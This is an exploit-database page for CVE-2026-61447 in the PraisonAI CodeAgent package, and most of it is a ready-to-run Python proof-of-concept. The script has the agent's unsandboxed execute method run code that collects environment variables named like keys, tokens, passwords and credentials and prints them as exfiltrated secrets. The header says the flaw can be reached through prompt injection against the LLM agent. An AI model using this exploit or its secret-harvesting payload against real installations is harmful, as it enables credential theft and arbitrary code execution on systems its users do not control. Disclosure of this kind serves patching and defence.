---
title: PraisonAI CodeAgent < = 1.6.77 Remote Code Execution (RCE) via Unsandboxed LLM Code Execution
url: https://cxsecurity.com/issue/WLB-2026070005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-19
fetch_date: 2026-07-20T05:32:06.517214
---

# PraisonAI CodeAgent < = 1.6.77 Remote Code Execution (RCE) via Unsandboxed LLM Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PraisonAI CodeAgent <= 1.6.77 Remote Code Execution (RCE) via Unsandboxed LLM Code Execution** **2026.07.19**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-61447](https://cxsecurity.com/cveshow/CVE-2026-61447/ "Click to see CVE-2026-61447")**  CWE: **[CWE-94 Improper Control of Generation of Code (&#039;Code Injection&#039;)](https://cxsecurity.com/cwe/CWE-94%20Improper%20Control%20of%20Generation%20of%20Code%20%28%26#039;Code Injection&#039;) "Click to see CWE-94 Improper Control of Generation of Code ('Code Injection')")**  **[**Dork:** no](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: PraisonAI CodeAgent <= 1.6.77 Remote Code Execution (RCE) via Unsandboxed LLM Code Execution
# CVE: CVE-2026-61447
# Date: 2026-07-13
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://github.com/MervinPraison/PraisonAI
# Software Link: https://pypi.org/project/praisonaiagents/
# Affected: praisonaiagents <= 1.6.77
# Tested on: praisonaiagents 1.6.77
# Category: Remote Code Execution
# Platform: Linux / Windows / macOS
# Exploit Type: Python Script
# CVSS: 10.0 (Critical)
# Description: The CodeAgent.\_execute\_python() in PraisonAI executes LLM-generated code without sandboxing, AST validation, or import restrictions. This allows full environment secret exfiltration and arbitrary code execution via prompt injection.
# Fixed in: praisonaiagents >= 1.6.78
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# --
#
# Notes:
# • Requires the vulnerable praisonaiagents package installed.
# • Demonstrates direct RCE and secret leakage.
#
# How to Use
#
# Step 1:
# pip install praisonaiagents==1.6.77
#
# Step 2:
# python3 exploit.py
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
banner()
from praisonaiagents.agent.code\_agent import CodeAgent
import json
agent = CodeAgent(name="poc-agent")
malicious\_code = """
import os
import json
secrets = {k: v for k, v in os.environ.items()
if any(keyword in k.upper() for keyword in
['KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'CREDENTIAL', 'API', 'AUTH'])}
print("=== EXFILTRATED SECRETS ===")
print(json.dumps(secrets, indent=2))
"""
print("Executing malicious LLM-generated code...")
result = agent.execute(malicious\_code)
print("\n=== Execution Result ===")
print("STDOUT:", result.get('stdout', ''))
print("STDERR:", result.get('stderr', ''))
print("Return Code:", result.get('returncode', ''))

**##### References:**

https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-2xv2-w8cq-5gxw

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026070005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top